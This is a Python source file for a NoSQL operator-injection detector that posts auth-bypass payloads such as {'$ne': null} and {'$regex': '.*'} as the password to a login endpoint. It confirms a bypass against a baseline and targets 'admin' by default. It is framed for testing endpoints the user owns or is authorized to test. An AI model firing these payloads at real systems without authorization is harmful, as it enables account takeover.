#!/usr/bin/env python3
"""
nosqli.py — NoSQL (operator) injection detector (INTERNAL edition).

Document stores (MongoDB et al.) take query operators as JSON. If a login or
search endpoint drops user JSON straight into the query, an attacker sends
{"$ne": null} or {"$gt": ""} instead of a value and matches everything — classic
auth bypass. This sends operator payloads and confirms a bypass differentially
against a known-bad baseline.

    python TOOLS/nosqli.py --url http://127.0.0.1:9200/api/login --user-field username --pass-field password
"""
import argparse
import difflib
import json
import os
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION
from privacy_guard import privacy_user_agent

# Operator payloads placed as the PASSWORD value (JSON object).
OPERATORS = [
    ("$ne null", {"$ne": None}),
    ("$ne empty", {"$ne": ""}),
    ("$gt empty", {"$gt": ""}),
    ("$regex any", {"$regex": ".*"}),
    ("$exists", {"$exists": True}),
    ("$in", {"$in": ["", "a", "admin"]}),
]
SUCCESS_HINTS = ("\"ok\": true", "\"ok\":true", "token", "welcome", "dashboard",
                 "success", "logged in", "\"authenticated\": true")


class NoSQLi(VibeTool):
    def __init__(self, base):
        super().__init__("NoSQLi", "NoSQL Operator Injection Detector")
        self.base = base
        self.findings = 0

    def _post(self, obj):
        try:
            req = urllib.request.Request(
                self.base, data=json.dumps(obj).encode(), method="POST",
                headers={"User-Agent": privacy_user_agent("NoSQLi"),
                         "Content-Type": "application/json", "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.getcode(), r.read(20000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(20000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def run(self, user_field, pass_field, username):
        self.banner()
        self.log(f"NoSQL operator-injection test: {self.base}")

        # Baseline: a definitely-wrong string password.
        b_st, b_body = self._post({user_field: username, pass_field: "definitely_wrong_pw_zzz"})
        self.log(f"Baseline (bad string password): status={b_st}")

        for label, op in OPERATORS:
            st, body = self._post({user_field: username, pass_field: op})
            low = body.lower()
            bypassed = (
                (st == 200 and b_st in (401, 403)) or
                (any(h in low for h in SUCCESS_HINTS) and not any(h in b_body.lower() for h in SUCCESS_HINTS)) or
                (st < 400 and difflib.SequenceMatcher(None, b_body, body).ratio() < 0.6)
            )
            if bypassed:
                self.log(f"NoSQL INJECTION CONFIRMED — password:{label} bypassed auth "
                         f"({b_st}->{st}). Operator reached the query.", "hack")
                self.log(f"  response: {body[:140].strip()}", "crit")
                self.findings += 1
                break
            else:
                self.log(f"{label}: rejected ({st})", "pass")

        self.log("=" * 40)
        if self.findings:
            self.log("NoSQL operator injection present — the endpoint trusts JSON-typed input.", "hack")
        else:
            self.log("No NoSQL operator injection — input is coerced/validated.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="NoSQLi - NoSQL operator injection detector")
    p.add_argument("--url", required=True, help="Login/search endpoint URL you own/are authorized to test")
    p.add_argument("--user-field", default="username", help="Username field name (default: username)")
    p.add_argument("--pass-field", default="password", help="Password field name (default: password)")
    p.add_argument("--user", dest="username", default="admin", help="Username to target (default: admin)")
    p.add_argument("-v", "--version", action="version", version=f"NoSQLi {FRAMEWORK_VERSION}")
    args = p.parse_args(argv)
    return NoSQLi(args.url).run(args.user_field, args.pass_field, args.username)


if __name__ == "__main__":
    sys.exit(main())
